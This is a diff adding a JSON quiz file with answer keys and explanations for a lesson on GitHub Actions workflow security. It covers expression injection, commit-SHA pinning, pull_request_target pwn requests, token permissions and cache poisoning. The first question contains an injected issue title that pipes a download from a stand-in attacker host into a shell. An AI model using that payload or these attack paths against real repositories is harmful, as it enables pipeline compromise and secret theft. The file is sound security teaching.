@@ -1,0 +1,84 @@
+{
+  "$schema": "../../../schema/quiz.schema.json",
+  "lesson": "cicd/workflow-security",
+  "questions": [
+    {
+      "id": "pre-1",
+      "stage": "pre",
+      "prompt": "A step has `run: echo \"Title: ${{ github.event.issue.title }}\"`. An outsider opens an issue titled `\"; curl -sSf https://evil.example | sh; #`. What happens?",
+      "choices": [
+        "The shell prints the title literally, because it is inside double quotes",
+        "GitHub escapes event values before it runs the script",
+        "Nothing, because issues cannot start workflows",
+        "The curl command runs: the expression is substituted into the script text before the shell parses it"
+      ],
+      "answer": 3,
+      "explanation": "`${{ }}` is template expansion done by GitHub before the shell starts, so the title's quote closes the echo string and the rest is a command. Passing the title through `env:` and reading `\"$TITLE\"` makes it data, because the shell expands variables after parsing."
+    },
+    {
+      "id": "check-1",
+      "stage": "check",
+      "prompt": "Which `uses:` reference cannot be changed by the action's owner after you have reviewed the code it points at?",
+      "choices": [
+        "`actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1`",
+        "`actions/checkout@v7.0.1`",
+        "`actions/checkout@main`",
+        "`actions/checkout@v7`"
+      ],
+      "answer": 0,
+      "explanation": "Branches and tags, including full version tags like `v7.0.1`, are pointers that anyone with write access can move. A full 40-character commit SHA names the content itself. A lockfile records the same pin outside the workflow file."
+    },
+    {
+      "id": "check-2",
+      "stage": "check",
+      "prompt": "A `pull_request_target` workflow checks out `github.event.pull_request.head.sha` and runs `npm ci`. Why is that critical even though the job only has `contents: read`?",
+      "choices": [
+        "It is not critical; a read-only token cannot do any harm",
+        "The contributor's install scripts run in the base repository's context, with the repository's secrets, its cache scope and whatever the token can read",
+        "`npm ci` never runs install scripts",
+        "GitHub refuses to check out fork code in `pull_request_target`"
+      ],
+      "answer": 1,
+      "explanation": "This is a pwn request. The trigger runs the base workflow with the base repository's secrets, so the contributor's `preinstall` script gets them, can read private code with the token, and can write cache entries if the job's cache mode allows it. Build untrusted code under `pull_request` instead."
+    },
+    {
+      "id": "check-3",
+      "stage": "check",
+      "prompt": "A job's only step runs `gh pr comment \"$PR\" --body done`. Which token configuration is least privilege?",
+      "choices": [
+        "`permissions: write-all`",
+        "No `permissions:` block, so the default applies",
+        "`permissions:` with only `pull-requests: write`, and `permissions: {}` at the workflow level",
+        "`permissions: read-all`"
+      ],
+      "answer": 2,
+      "explanation": "Listing a scope sets every unlisted scope to `none`, so `pull-requests: write` alone is exactly what commenting needs. With no block the owner's default applies, which is read and write on most scopes unless the restricted default was chosen."
+    },
+    {
+      "id": "post-1",
+      "stage": "post",
+      "prompt": "A release workflow, started by a tag push, restores `node_modules` with `actions/cache`. What makes that exploitable?",
+      "choices": [
+        "Nothing, because each workflow has its own cache",
+        "Only a cache key that does not use `hashFiles()`",
+        "Any job that runs untrusted code and can save into the default branch's cache scope, for example a `pull_request_target` job with an explicit `cache-mode: write`, can plant an entry the release restores without verification",
+        "Tag pushes cannot read caches at all"
+      ],
+      "answer": 2,
+      "explanation": "Cache entries are not signed and the default branch's scope is shared by all its workflows. Current GitHub gives low-trust triggers read-only cache access unless a `cache-mode` lifts it; release jobs should not restore caches at all (`cache-mode: none` or no cache step)."
+    },
+    {
+      "id": "post-2",
+      "stage": "post",
+      "prompt": "In March 2025 the tags of `tj-actions/changed-files` were moved to a malicious commit. Why did workflows that pinned the action to a commit SHA leak nothing?",
+      "choices": [
+        "GitHub blocked the action for everyone within minutes",
+        "SHA-pinned actions receive no secrets",
+        "The attacker could only move tags; a pinned SHA names the old commit's content, so those workflows kept running the code that had been reviewed",
+        "Dependabot reverted the tag change in every repository"
+      ],
+      "answer": 2,
+      "explanation": "A tag is a movable pointer; a commit SHA is a content hash. The compromised code printed runner secrets, double base64-encoded, into build logs of every workflow that resolved the moved tags. Pins with a bot to update them, or a workflow lockfile, close that path."
+    }
+  ]
+}
